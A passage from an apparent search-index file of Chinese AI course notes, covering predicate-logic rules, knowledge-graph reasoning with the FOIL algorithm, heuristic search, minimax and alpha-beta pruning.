<li>\u5b9a\u7406\uff1a\u81ea\u7531\u53d8\u5143\u65e2\u53ef\u4ee5\u5b58\u5728\u4e8e\u91cf\u8bcd\u7684\u7ea6\u675f\u8303\u56f4\u4e4b\u5185\uff0c\u4e5f\u53ef\u4ee5\u5b58\u5728\u4e8e\u91cf\u8bcd\u7ea6\u675f\u8303\u56f4\u4e4b\u5916\uff0c\u5373\uff1a<ul> <li>\\((\\forall x)(A(x)\\vee B)\\equiv(\\forall x)A(x)\\vee B\\)</li> <li>\\((\\forall x)(A(x)\\wedge B)\\equiv(\\forall x)A(x)\\wedge B\\)</li> <li>\\((\\exist x)(A(x)\\vee B)\\equiv(\\exist x)A(x)\\vee B\\)</li> <li>\\((\\exist x)(A(x)\\wedge B)\\equiv(\\exist x)A(x)\\wedge B\\)</li> </ul> </li> <li>\u5b9a\u7406\uff1a\u5728\u7ea6\u675f\u53d8\u5143\u76f8\u540c\u7684\u6761\u4ef6\u4e0b\uff0c\u91cf\u8bcd\u7684\u8fd0\u7b97\u6ee1\u8db3\u5206\u914d\u7387</li> <li>\u5b9a\u7406\uff1a\u5f53\u516c\u5f0f\u4e2d\u5b58\u5728\u591a\u4e2a\u91cf\u8bcd\u65f6\uff0c\u82e5\u591a\u4e2a\u91cf\u8bcd\u90fd\u662f\u5168\u79f0\u91cf\u8bcd\u6216\u8005\u90fd\u662f\u5b58\u5728\u91cf\u8bcd\uff0c\u5219\u91cf\u8bcd\u4f4d\u7f6e\u53ef\u4ee5\u4e92\u6362\uff1b\u82e5\u591a\u4e2a\u91cf\u8bcd\u4e2d\u65e2\u6709\u5168\u79f0\u91cf\u8bcd\u53c8\u6709\u5b58\u5728\u91cf\u8bcd\uff0c\u5219\u91cf\u8bcd\u4f4d\u7f6e\u4e0d\u53ef\u4ee5\u968f\u610f\u4e92\u6362    </li> </ul> </li> <li>\u8c13\u8bcd\u903b\u8f91\uff1a<ul> <li>\u53ea\u5305\u542b\u4e2a\u4f53\u8c13\u8bcd\u548c\u4e2a\u4f53\u91cf\u8bcd\u7684\u8c13\u8bcd\u903b\u8f91\u79f0\u4e3a\u4e00\u9636\u8c13\u8bcd\u903b\u8f91\uff0c\u65e0\u6cd5\u5bf9\u8c13\u8bcd\u548c\u91cf\u8bcd\u8fdb\u884c\u91cf\u5316</li> <li>\u9700\u8981\u9ad8\u9636\u8c13\u8bcd\u548c\u9ad8\u9636\u91cf\u8bcd\u8fdb\u884c\u91cf\u5316\uff0c\u5305\u542b\u9ad8\u9636\u8c13\u8bcd\u548c\u9ad8\u9636\u91cf\u8bcd\u7684\u8c13\u8bcd\u903b\u8f91\u79f0\u4e3a\u9ad8\u9636\u8c13\u8bcd\u903b\u8f91</li> </ul> </li> <li>\u9879\uff1a\u9879\u662f\u63cf\u8ff0\u5bf9\u8c61\u7684\u903b\u8f91\u8868\u8fbe\u5f0f\uff0c\u9012\u5f52\u5b9a\u4e49\uff1a<ul> <li>\u5e38\u91cf\u7b26\u53f7\u548c\u53d8\u91cf\u7b26\u53f7\u662f\u9879</li> <li>\u82e5 \\(f(x_1, x_2,\\cdots, x_n)\\) \u662f \\(n\\) \u5143\u51fd\u6570\u7b26\u53f7\uff0c\\(t_1, t_2, \\cdots, t_n\\) \u662f\u9879\uff0c\u5219 \\(f(t_1, t_2, \\cdots, t_n)\\) \u662f\u9879</li> <li>\u6709\u9650\u6b21\u6570\u5730\u4f7f\u7528\u4e0a\u8ff0\u89c4\u5219\u4ea7\u751f\u7684\u7b26\u53f7\u4e32\u662f\u9879</li> </ul> </li> <li>\u539f\u5b50\u8c13\u8bcd\u516c\u5f0f\uff1a\u82e5 \\(P(x_1, x_2, \\cdots, x_n)\\) \u662f \\(n\\) \u5143\u8c13\u8bcd\uff0c\\(t_1, t_2, \\cdots, t_n\\) \u662f\u9879\uff0c\u5219\u79f0 \\(P(t_1, t_2, \\cdots, t_n)\\) \u4e3a\u539f\u5b50\u8c13\u8bcd\u516c\u5f0f\uff0c\u7b80\u79f0\u539f\u5b50\u516c\u5f0f</li> <li>\u5408\u5f0f\u516c\u5f0f\uff1a\u7531\u903b\u8f91\u8054\u7ed3\u8bcd\u548c\u539f\u5b50\u516c\u5f0f\u6784\u6210\u7684\u7528\u4e8e\u9648\u8ff0\u4e8b\u5b9e\u7684\u590d\u6742\u8bed\u53e5\uff0c\u53c8\u79f0\u8c13\u8bcd\u516c\u5f0f\uff1a<ul> <li>\u547d\u9898\u5e38\u9879\uff0c\u547d\u9898\u53d8\u9879\uff0c\u539f\u5b50\u8c13\u8bcd\u516c\u5f0f\u90fd\u662f\u5408\u5f0f\u516c\u5f0f</li> <li>\u901a\u8fc7\u903b\u8f91\u8054\u7ed3\u8bcd\u8054\u7ed3\u5408\u5f0f\u516c\u5f0f\u5f97\u5230\u7684\u4e5f\u662f\u5408\u5f0f\u516c\u5f0f</li> <li>\u5982\u679c \\(A\\) \u662f\u5408\u5f0f\u516c\u5f0f\uff0c\\(x\\) \u662f\u4e2a\u4f53\u53d8\u9879\uff0c\u5219 \\((\\exist x)A(x), (\\forall x)A(x)\\) \u4e5f\u662f\u5408\u5f0f\u516c\u5f0f</li> <li>\u6709\u9650\u6b21\u6570\u5730\u4f7f\u7528\u4e0a\u8ff0\u89c4\u5219</li> </ul> </li> <li>\u63a8\u7406\u89c4\u5219\uff08\\(A(x)\\) \u662f\u8c13\u8bcd\u516c\u5f0f\uff0c\\(x\\) \u548c \\(y\\) \u662f\u53d8\u5143\uff0c\\(a\\) \u662f\u5e38\u91cf\u7b26\u53f7\uff09<ul> <li>\u5168\u79f0\u91cf\u8bcd\u6d88\u53bb universal instantiation\uff08UI\uff09\uff1a\\((\\forall x)A(x)\\Rightarrow A(y)\\)</li> <li>\u5168\u79f0\u91cf\u8bcd\u5f15\u5165 universal generalization\uff08UG\uff09\uff1a\\(A(y)\\Rightarrow(\\forall x)A(x)\\)</li> <li>\u5b58\u5728\u91cf\u8bcd\u6d88\u53bb existential instantiation\uff08EI\uff09\uff1a\\((\\exist x)A(x)\\Rightarrow A(a)\\)</li> <li>\u5b58\u5728\u91cf\u8bcd\u5f15\u5165 existential generalization\uff08EG\uff09\uff1a\\(A(a)\\Rightarrow(\\exist x)A(x)\\)</li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_5","title":"\u77e5\u8bc6\u56fe\u8c31\u63a8\u7406","text":"<ul> <li>\u77e5\u8bc6\u56fe\u8c31\uff08knowledge graph\uff09\u7531\u6709\u5411\u56fe\uff08directed graph\uff09\u6784\u6210\uff0c\u88ab\u7528\u6765\u63cf\u8ff0\u73b0\u5b9e\u4e16\u754c\u4e2d\u5b9e\u4f53\u53ca\u5b9e\u4f53\u4e4b\u95f4\u7684\u5173\u7cfb</li> <li>\u4e24\u4e2a\u8282\u70b9\u548c\u8fde\u63a5\u8fb9\u53ef\u8868\u793a\u4e3a\u5f62\u5982 &lt;left_node, relation, right_node&gt; \u7684\u4e09\u5143\u7ec4\u5f62\u5f0f\uff0c\u4e5f\u53ef\u8868\u793a\u4e3a\u4e00\u9636\u903b\u8f91\uff08fisrt order logic\uff0cFOL\uff09\u7684\u5f62\u5f0f</li> <li>\u5173\u7cfb\u63a8\u7406\u662f\u7edf\u8ba1\u5173\u7cfb\u5b66\u4e60\u7814\u7a76\u7684\u57fa\u672c\u95ee\u9898\uff0c\u4e5f\u662f\u5f53\u524d\u77e5\u8bc6\u56fe\u8c31\u9886\u57df\u7814\u7a76\u7684\u70ed\u70b9\u95ee\u9898</li> <li>\u5f52\u7eb3\u903b\u8f91\u7a0b\u5e8f\u8bbe\u8ba1\uff08inductive logic programming\uff0cILP\uff09<ul> <li>ILP \u662f\u673a\u5668\u5b66\u4e60\u548c\u903b\u8f91\u7a0b\u5e8f\u8bbe\u8ba1\u4ea4\u53c9\u9886\u57df\u7684\u7814\u7a76\u5185\u5bb9</li> <li>ILP \u4f7f\u7528\u4e00\u9636\u8c13\u8bcd\u903b\u8f91\u8fdb\u884c\u77e5\u8bc6\u8868\u793a\uff0c\u901a\u8fc7\u4fee\u6539\u548c\u6269\u5145\u903b\u8f91\u8868\u8fbe\u5f0f\u5bf9\u73b0\u6709\u77e5\u8bc6\u8fdb\u884c\u5f52\u7eb3\uff0c\u5b8c\u6210\u63a8\u7406\u5185\u5bb9</li> <li>FOIL\uff08first order inductive learner\uff09\u7b97\u6cd5\u662f ILP \u7684\u4ee3\u8868\u6027\u65b9\u6cd5\uff0c\u901a\u8fc7\u5e8f\u8d2f\u8986\u76d6\u5b66\u4e60\u63a8\u7406\u89c4\u5219</li> </ul> </li> <li>\u8def\u5f84\u6392\u5e8f\u7b97\u6cd5\uff08path ranking algorithm\uff0cGRA\uff09<ul> <li>\u5c06\u5b9e\u4f53\u4e4b\u95f4\u7684\u5173\u8054\u8def\u5f84\u4f5c\u4e3a\u7279\u5f81\uff0c\u6765\u5b66\u4e60\u76ee\u6807\u5173\u7cfb\u7684\u5206\u7c7b\u5668</li> <li>\u6d41\u7a0b\uff1a<ol> <li>\u7279\u5f81\u62bd\u53d6\uff1a\u751f\u6210\u5e76\u9009\u62e9\u8def\u5f84\u7279\u5f81\u96c6\u5408\u3002\u751f\u6210\u8def\u5f84\u65b9\u6cd5\uff1a\u968f\u673a\u6e38\u8d70\uff08random walk\uff09\u3001BFS\u3001DFS</li> <li>\u7279\u5f81\u8ba1\u7b97\uff1a\u8ba1\u7b97\u6bcf\u4e2a\u8bad\u7ec3\u6837\u4f8b\u7684\u7279\u5f81\u503c \\(P(s\\rightarrow t; \\pi_j)\\)\uff0c\u8868\u793a\u4ece\u5b9e\u4f53\u8282\u70b9 \\(s\\) \u51fa\u53d1\uff0c\u901a\u8fc7\u5173\u7cfb\u8def\u5f84 \\(\\pi_j\\) \u8fbe\u5230\u5b9e\u4f53\u8282\u70b9 \\(t\\) \u7684\u6982\u7387\u3002\u6216\u8868\u793a\u662f\u5426\u5b58\u5728\u8fd9\u6837\u4e00\u6761\u8def\u5f84\uff0c\u6216\u8868\u793a\u8def\u5f84\u51fa\u73b0\u7684\u9891\u6b21\u9891\u7387</li> <li>\u5206\u7c7b\u5668\u8bad\u7ec3\uff1a\u6839\u636e\u8bad\u7ec3\u6837\u4f8b\u7279\u5f81\u503c\uff0c\u4e3a\u76ee\u6807\u5173\u7cfb\u8bad\u7ec3\u5206\u7c7b\u5668\u3002\u8bad\u7ec3\u540e\u53ef\u7528\u4e8e\u63a8\u7406\u4e24\u4e2a\u5b9e\u4f53\u95f4\u662f\u5426\u5b58\u5728\u76ee\u6807\u5173\u7cfb</li> </ol> </li> </ul> </li> </ul> FOIL \u7b97\u6cd5 <ul> <li>\u7b97\u6cd5\u5185\u5bb9<ul> <li>\u8f93\u5165\uff1a\u76ee\u6807\u8c13\u8bcd \\(P\\)\uff0c\u76ee\u6807\u8c13\u8bcd \\(P\\) \u7684\u8bad\u7ec3\u6837\u4f8b\uff08\u6b63\u4f8b\u96c6\u5408 \\(E^+\\) \u548c\u53cd\u4f8b\u96c6\u5408 \\(E^-\\)\uff09\uff0c\u4ee5\u53ca\u5176\u5b83\u80cc\u666f\u77e5\u8bc6\u6837\u4f8b</li> <li>\u8f93\u51fa\uff1a\u53ef\u5f97\u5230\u76ee\u6807\u8c13\u8bcd\u8fd9\u4e00\u7ed3\u8bba\u7684\u63a8\u7406\u89c4\u5219</li> <li>\u8fc7\u7a0b\uff1a<ol> <li>\u5c06\u76ee\u6807\u8c13\u8bcd\u4f5c\u4e3a\u6240\u5b66\u4e60\u63a8\u7406\u89c4\u5219\u7684\u7ed3\u8bba</li> <li>\u5c06\u5176\u5b83\u8c13\u8bcd\u9010\u4e00\u4f5c\u4e3a\u524d\u63d0\u7ea6\u675f\u8c13\u8bcd\u52a0\u5165\u63a8\u7406\u89c4\u5219\uff0c\u8ba1\u7b97\u6240\u5f97\u5230\u63a8\u7406\u89c4\u5219\u7684 FOIL \u4fe1\u606f\u589e\u76ca\u503c\uff0c\u9009\u53d6\u53ef\u5e26\u6765\u6700\u5927\u4fe1\u606f\u589e\u76ca\u503c\u7684\u524d\u63d0\u7ea6\u675f\u8c13\u8bcd\u52a0\u5165\u539f\u6765\u7684\u63a8\u7406\u89c4\u5219\uff0c\u5f97\u5230\u65b0\u7684\u63a8\u7406\u89c4\u5219\uff0c\u5e76\u5c06\u8bad\u7ec3\u6837\u4f8b\u96c6\u5408\u4e2d\u4e0e\u8be5\u63a8\u7406\u89c4\u5219\u4e0d\u7b26\u7684\u6837\u4f8b\u53bb\u6389</li> <li>\u91cd\u590d b. \u8fc7\u7a0b\uff0c\u77e5\u9053\u6240\u5f97\u5230\u7684\u63a8\u7406\u89c4\u5219\u4e0d\u8986\u76d6\u4efb\u4f55\u53cd\u4f8b</li> </ol> </li> </ul> </li> <li>\u76ee\u6807\u8c13\u8bcd\u662f\u9700\u8981\u63a8\u65ad\u89c4\u5219\u7684\u7ed3\u8bba\uff0c\u4e5f\u79f0\u4e3a\u89c4\u5219\u5934</li> <li>\u7ed9\u5b9a\u63a8\u7406\u7ed3\u8bba\u540e\uff0cFOIL \u7b97\u6cd5\u5b66\u4e60\u5f97\u5230\u4f7f\u5f97\u7ed3\u8bba\u6ee1\u8db3\u7684\u524d\u63d0\u6761\u4ef6\uff0c\u5373\u76ee\u6807\u8c13\u8bcd\u4f5c\u4e3a\u7ed3\u8bba\u7684\u63a8\u7406\u89c4\u5219</li> <li>FOIL \u7b97\u6cd5\u4ece\u4e00\u822c\u5230\u7279\u6b8a\uff0c\u9010\u6b65\u6dfb\u52a0\u76ee\u6807\u8c13\u8bcd\u7684\u524d\u63d0\u7ea6\u675f\u8c13\u8bcd\uff0c\u76f4\u5230\u6240\u6784\u6210\u7684\u63a8\u7406\u89c4\u5219\u4e0d\u8986\u76d6\u4efb\u4f55\u53cd\u4f8b</li> <li> <p>\u6dfb\u52a0\u524d\u63d0\u7ea6\u675f\u8c13\u8bcd\u540e\u6240\u5f97\u7684\u63a8\u7406\u89c4\u5219\u7684\u8d28\u91cf\u7684\u597d\u574f\u7531\u4fe1\u606f\u589e\u76ca\u503c\uff08information gain\uff09\u4f5c\u4e3a\u8bc4\u4f30\u6807\u51c6\uff0c\u8ba1\u7b97\u65b9\u6cd5\uff1a</p> \\[ \\mathrm{FOIL\\_Gain} = \\widehat{m_+}\\cdot\\left(\\log_2\\frac{\\widehat{m_+}}{\\widehat{m_+}+\\widehat{m_-}}-\\log_2\\frac{m_+}{m_++m_-}\\right) \\] <ul> <li>\\(\\widehat{m_+}, \\widehat{m_-}\\) \u662f\u589e\u52a0\u524d\u63d0\u7ea6\u675f\u8c13\u8bcd\u540e\u5f97\u5230\u7684\u65b0\u63a8\u7406\u89c4\u5219\u80fd\u8986\u76d6\u7684\u6b63\u4f8b\u548c\u53cd\u4f8b\u6570\u76ee</li> <li>\\(m_+, m_-\\) \u662f\u539f\u63a8\u7406\u89c4\u5219\u8986\u76d6\u7684\u6b63\u4f8b\u548c\u53cd\u4f8b\u6570\u76ee</li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_6","title":"\u641c\u7d22\u6c42\u89e3","text":""},{"location":"cs/ai/basic/#_7","title":"\u641c\u7d22\u7b97\u6cd5\u57fa\u7840","text":"<ul> <li>\u8bc4\u4ef7\u6307\u6807<ul> <li>\u5b8c\u5907\u6027\uff1a\u80fd\u5426\u627e\u5230\u89e3\uff08\u4e0d\u4e00\u5b9a\u6700\u4f18\uff09</li> <li>\u6700\u4f18\u6027\uff1a\u80fd\u5426\u4fdd\u8bc1\u627e\u5230\u7684\u7b2c\u4e00\u4e2a\u89e3\u662f\u6700\u4f18\u89e3</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff08\u901a\u8fc7\u6269\u5c55\u7684\u7ed3\u70b9\u6570\u91cf\u8861\u91cf\uff09</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff08\u901a\u8fc7\u540c\u65f6\u8bb0\u5f55\u7684\u7ed3\u70b9\u6570\u91cf\u8861\u91cf\uff09</li> </ul> </li> <li>\u641c\u7d22\u7b97\u6cd5\u6846\u67b6     <pre><code>F &lt;- {\u6839\u8282\u70b9}\nwhile F != \u2205 do\n    n &lt;- pick_from(F)\n    F &lt;- F - {n}\n    if goal_test(n) then\n        return n.path\n    end\n    F &lt;- F \u222a successor_nodes(n)\nend\n</code></pre><ul> <li>pick_from \u51b3\u5b9a\u6269\u5c55\u7ed3\u70b9\u7684\u987a\u5e8f\uff0csuccessor_nodes \u51b3\u5b9a\u54ea\u4e9b\u8282\u70b9\u53ef\u88ab\u653e\u5165\u8fb9\u7f18\u96c6\u5408\uff08fringe set\uff0c\u4e5f\u53eb\u5f00\u8868\uff0copen list\uff09\u4ee5\u5728\u540e\u9762\u6269\u5c55\uff08expand\uff09</li> <li>\u6bcf\u6b21\u4ece\u8fb9\u7f18\u96c6\u5408\u4e2d\u53d6\u51fa\u6700\u4e0a\u5c42\uff08\u6700\u6d45\uff09\u7684\u7ed3\u70b9\u65f6\u662f\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff08breadth first search\uff0cBFS\uff09</li> <li>\u6bcf\u6b21\u4ece\u8fb9\u7f18\u96c6\u5408\u4e2d\u53d6\u51fa\u6700\u4e0b\u5c42\uff08\u6700\u6df1\uff09\u7684\u7ed3\u70b9\u65f6\u662f\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\uff08depth first search\uff0cDFS\uff09</li> <li>\u653e\u5f03\u6269\u5c55\u90e8\u5206\u7ed3\u70b9\u7684\u505a\u6cd5\u79f0\u4e3a\u526a\u679d\uff08pruning\uff09</li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_8","title":"\u542f\u53d1\u5f0f\u641c\u7d22","text":"<ul> <li>\u5229\u7528\u4e00\u4e9b\u80fd\u591f\u8f85\u52a9\u7b97\u6cd5\u505a\u51fa\u51b3\u7b56\u7684\u989d\u5916\u4fe1\u606f\u7684\u641c\u7d22\u7b97\u6cd5\u79f0\u4e3a\u542f\u53d1\u5f0f\u641c\u7d22\uff08heuristic search\uff09\uff0c\u6216\u6709\u4fe1\u606f\u641c\u7d22\uff08informed search\uff09</li> <li>\u63d0\u4f9b\u7684\u8fd9\u4e9b\u8f85\u52a9\u4fe1\u606f\u79f0\u4e3a\u542f\u53d1\u4fe1\u606f</li> <li>\u542f\u53d1\u4fe1\u606f\u901a\u5e38\u5f62\u5f0f\u5316\u4e3a\u4e00\u4e2a\u5173\u4e8e\u7ed3\u70b9\u7684\u51fd\u6570 \\(h(n)\\)\uff0c\u5176\u7528\u4e8e\u4f30\u8ba1\u7ed3\u70b9 \\(n\\) \u8ddd\u79bb\u8fbe\u5230\u76ee\u6807\u8fd8\u9700\u4ed8\u51fa\u591a\u5c11\u4ee3\u4ef7\uff0c\u8fd9\u4e2a\u51fd\u6570\u79f0\u4e3a\u542f\u53d1\u51fd\u6570\uff08heuristic function\uff09<ul> <li>\u542f\u53d1\u51fd\u6570\u901a\u5e38\u662f\u975e\u8d1f\u7684</li> <li>\u5e38\u89c1\u7528\u6cd5\u662f\u7528\u6765\u66f4\u6539\u524d\u9762\u7684 pick_from \u51fd\u6570\u6765\u89c4\u5b9a\u6311\u9009\u7ed3\u70b9\u7684\u987a\u5e8f</li> </ul> </li> <li>\u5bf9\u4e8e\u4efb\u610f\u7ed3\u70b9 \\(n\\)\uff0c\u51b3\u5b9a\u4e86\u641c\u7d22\u7b97\u6cd5\u6269\u5c55\u7ed3\u70b9 \\(n\\) \u7684\u4f18\u5148\u5ea6\u7684\u51fd\u6570 \\(f(n)\\) \u79f0\u4e3a\u8bc4\u4ef7\u51fd\u6570\uff08evaluation function\uff09<ul> <li>\u8bc4\u4ef7\u51fd\u6570\u503c\u8d8a\u5c0f\uff0c\u88ab\u6311\u9009\u7684\u4f18\u5148\u7ea7\u8d8a\u9ad8</li> <li>\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\u4e2d \\(f(n)\\) \u53ef\u88ab\u5b9a\u4e49\u4e3a\u8be5\u7ed3\u70b9\u6df1\u5ea6\u7684\u5012\u6570</li> <li>\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\u4e2d \\(f(n)\\) \u53ef\u88ab\u5b9a\u4e49\u4e3a\u8be5\u7ed3\u70b9\u6df1\u5ea6</li> </ul> </li> <li> <p>\u8d2a\u5a6a\u6700\u4f73\u4f18\u5148\u641c\u7d22</p> <ul> <li>\u5373 greedy best-first search\uff0cGBFS</li> <li>\u4f18\u5148\u6269\u5c55\u8ddd\u79bb\u76ee\u6807\u8fd1\u7684\u7ed3\u70b9\uff0c\u5373\u4ee4 \\(f(n) = h(n)\\)</li> <li>\u4e0d\u6392\u9664\u73af\u8def\u7684\u8d2a\u5a6a\u6700\u4f73\u4f18\u5148\u641c\u7d22\u7b97\u6cd5\u662f\u4e0d\u5b8c\u5907\u7684</li> <li>\u6392\u9664\u73af\u8def\u7684\u8d2a\u5a6a\u6700\u4f73\u4f18\u5148\u641c\u7d22\u662f\u5b8c\u5907\u7684\uff0c\u4f46\u4e0d\u4e00\u5b9a\u6700\u4f18</li> <li>\u6700\u574f\u60c5\u51b5\u4e0b\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u548c\u7a7a\u95f4\u590d\u6742\u5ea6\u5747\u4e3a \\(O(b^m)\\)<ul> <li>\\(b\\) \u4e3a\u5206\u652f\u56e0\u5b50\uff08\u6bcf\u4e2a\u7ed3\u70b9\u6700\u5927\u7684\u5206\u652f\u6570\u76ee\uff09</li> <li>\\(m\\) \u4e3a\u6700\u5927\u6df1\u5ea6\uff0c\u4e5f\u5c31\u662f\u641c\u7d22\u6811\u4e2d\u8def\u5f84\u7684\u6700\u5927\u53ef\u80fd\u957f\u5ea6</li> </ul> </li> </ul> </li> <li> <p>\u667a\u80fd\u4f53\u4e0d\u552f\u4e00\uff0c\u89e3\u51b3\u4fe1\u606f\u786e\u5b9a\u3001\u5168\u5c40\u53ef\u89c2\u5bdf\u3001\u8f6e\u6d41\u884c\u52a8\u3001\u8f93\u8d62\u6536\u76ca\u96f6\u548c\u7684\u535a\u5f08\u95ee\u9898\uff0c\u6c42\u89e3\u8fd9\u6837\u95ee\u9898\u7684\u7b97\u6cd5\u79f0\u4e3a\u5bf9\u6297\u641c\u7d22\uff08adversarial search\uff09\u6216\u535a\u5f08\u641c\u7d22\uff08game search\uff09</p> </li> <li>\u667a\u80fd\u4f53\u4f1a\u9009\u62e9\u6700\u5927\u5316\u81ea\u8eab\u5229\u76ca\u3001\u6700\u5c0f\u5316\u5bf9\u624b\u5229\u76ca\u7684\u7b56\u7565</li> <li>\u5f62\u5f0f\u5316\u63cf\u8ff0\uff1a<ul> <li>\u72b6\u6001\uff1a\u72b6\u6001 \\(s\\) \u5305\u62ec\u5f53\u524d\u6e38\u620f\u5c40\u9762\u548c\u5f53\u524d\u884c\u52a8\u7684\u667a\u80fd\u4f53\uff0c\u521d\u59cb\u72b6\u6001 \\(s_0\\) \u4e3a\u6e38\u620f\u5f00\u59cb\u65f6\u7684\u72b6\u6001\u3002\\(\\mathrm{player}(s)\\) \u8868\u793a\u72b6\u6001 \\(s\\) \u4e0b\u884c\u52a8\u7684\u667a\u80fd\u4f53</li> <li>\u52a8\u4f5c\uff1a\u52a8\u4f5c\u662f\u6307 \\(\\mathrm{player}(s)\\) \u5728\u5f53\u524d\u5c40\u9762\u4e0b\u53ef\u4ee5\u91c7\u53d6\u7684\u64cd\u4f5c \\(a\\)\uff0c\u8bb0\u52a8\u4f5c\u96c6\u5408\u4e3a \\(\\mathrm{actions}(s)\\)</li> <li>\u72b6\u6001\u8f6c\u79fb\uff1a\u72b6\u6001\u8f6c\u79fb\u51fd\u6570 \\(s' = \\mathrm{result}(s, a)\\) \u8868\u793a\u5728\u72b6\u6001 \\(s\\) \u4e0b\u91c7\u53d6\u52a8\u4f5c \\(a\\) \u540e\u7684\u4e0b\u4e00\u4e2a\u72b6\u6001</li> <li>\u7ec8\u5c40\u72b6\u6001\u6d4b\u8bd5\uff1a\u7ec8\u5c40\u72b6\u6001\u6d4b\u8bd5\u51fd\u6570 \\(\\mathrm{terminal\\_test}(s)\\) \u7528\u4e8e\u6d4b\u8bd5\u6e38\u620f\u662f\u5426\u5728\u72b6\u6001 \\(s\\) \u4e0b\u7ed3\u675f</li> <li>\u7ec8\u5c40\u5f97\u5206\uff1a\u7ec8\u5c40\u5f97\u5206\u51fd\u6570 \\(\\mathrm{utility}(s, p)\\) \u8868\u793a\u5728\u72b6\u6001 \\(s\\) \u4e0b\u73a9\u5bb6 \\(p\\) \u7684\u5f97\u5206<ul> <li>\u5bf9\u4e8e\u4e8c\u4eba\u96f6\u548c\u535a\u5f08\uff0c\u53ea\u9700\u8981\u8bb0\u5f55\u5176\u4e2d\u4e00\u4eba\u7684\u7ec8\u5c40\u5f97\u5206\u5373\u53ef</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_9","title":"\u6700\u5927\u6700\u5c0f\u641c\u7d22","text":"<ul> <li>\u6700\u5927\u6700\u5c0f\u641c\u7d22\uff08minimax search\uff09\u662f\u6c42\u89e3\u5bf9\u6297\u641c\u7d22\u95ee\u9898\u7684\u57fa\u672c\u7b97\u6cd5</li> <li>\u8be5\u7b97\u6cd5\u5047\u8bbe\u4e24\u540d\u73a9\u5bb6\u5728\u51b3\u7b56\u65f6\u603b\u662f\u7406\u6027\u5730\u503e\u5411\u4e8e\u6700\u5927\u5316\u81ea\u5df1\u7684\u5f97\u5206\uff08\u6700\u5c0f\u5316\u5bf9\u65b9\u5f97\u5206\uff09</li> <li>\u7b97\u6cd5\u8fc7\u7a0b<ul> <li>\u5047\u8bbe\u4ee5\u6700\u5927\u5316\u5f97\u5206\u4e3a\u76ee\u6807\u7684\u73a9\u5bb6\u4e3a MAX\uff0c\u4ee5\u6700\u5c0f\u5316\u5f97\u5206\u4e3a\u76ee\u6807\u7684\u73a9\u5bb6\u4e3a MIN</li> <li>\u67d0\u4e00\u5c42\u7531 MAX \u73a9\u5bb6\u884c\u52a8\uff0c\u5219\u5176\u4f1a\u9009\u62e9\u5f97\u5206\u6700\u5927\u7684\u5b50\u6811\u8fdb\u884c\u884c\u52a8</li> <li>\u67d0\u4e00\u5c42\u7531 MIN \u73a9\u5bb6\u884c\u52a8\uff0c\u5219\u5176\u4f1a\u9009\u62e9\u5f97\u5206\u6700\u5c0f\u7684\u5b50\u6811\u8fdb\u884c\u884c\u52a8</li> <li>\u9012\u5f52\u5730\u8fdb\u884c\u4e0a\u8ff0\u8fc7\u7a0b\uff0c\u76f4\u5230\u8fbe\u5230\u7ec8\u5c40\u72b6\u6001</li> <li>\uff08\u5b50\u6811\u7684\u5f97\u5206\u7531\u6240\u6709\u5b83\u7684\u5b50\u6811\u7684\u5f97\u5206\u53d6\u6700\u5927\u6216\u6700\u5c0f\u5f97\u5230\uff09</li> </ul> </li> </ul> \\[ \\mathrm{minimax}(s) = \\begin{cases} \\mathrm{utility}(s) &amp; \\text{if terminal\\_test(}s\\text{)} \\\\ \\max_{a \\in \\mathrm{actions}(s)} \\mathrm{minimax}(\\mathrm{result}(s, a)) &amp; \\text{if player(}s\\text{) = MAX} \\\\ \\min_{a \\in \\mathrm{actions}(s)} \\mathrm{minimax}(\\mathrm{result}(s, a)) &amp; \\text{if player(}s\\text{) = MIN} \\end{cases} \\] <ul> <li>\u6700\u5927\u6700\u5c0f\u641c\u7d22\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(b^m)\\)\uff0c\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(bm)\\)</li> </ul>"},{"location":"cs/ai/basic/#alpha-beta","title":"Alpha-Beta \u526a\u679d","text":"<ul> <li>\u5982\u679c\u641c\u7d22\u6811\u6781\u5927\uff0c\u5219\u6700\u5927\u6700\u5c0f\u641c\u7d22\u7684\u5f00\u9500\u5de8\u5927\uff0c\u65e0\u6cd5\u5728\u5408\u7406\u65f6\u95f4\u5185\u8fd4\u56de\u7ed3\u679c</li> <li> <p>Alpha-Beta \u526a\u679d\u7b97\u6cd5\u7684\u601d\u60f3\u5982\u4e0b\uff1a</p> \\[ \\begin{align*} \\mathrm{minimax}(s_0) &amp;= \\max(\\min(3, 9, 10), \\min(2, x, y), \\min(10, 5, 1))\\\\ &amp;= \\max(3, \\min(2, x, y), 1) \\end{align*} \\] <ul> <li>\u4e0a\u5f0f\u4e2d \\(\\min(2, x, y)\\) \u80af\u5b9a\u5c0f\u4e8e 2\uff0c\u800c\u5916\u9762\u4e00\u5c42\u6c42\u6700\u5927\u503c\u53c8\u6709 3 \u6bd4\u5b83\u5927</li> <li>\u6240\u4ee5\u5c31\u6ca1\u6709\u5fc5\u8981\u53bb\u641c\u7d22 \\(x, y\\) \u5bf9\u5e94\u7684\u5b50\u6811\u5f97\u5230\u5177\u4f53\u7684 \\(x, y\\) \u503c\uff0c\u53ef\u4ee5\u5c06\u8fd9\u4e24\u4e2a\u52a8\u4f5c\u526a\u679d\u6389</li> </ul> </li> </ul>"},{"location":"cs/ai/basic/#_10","title":"\u8499\u7279\u5361\u6d1b\u6811\u641c\u7d22","text":"<ul> <li>\u56db\u4e2a\u6b65\u9aa4<ul> 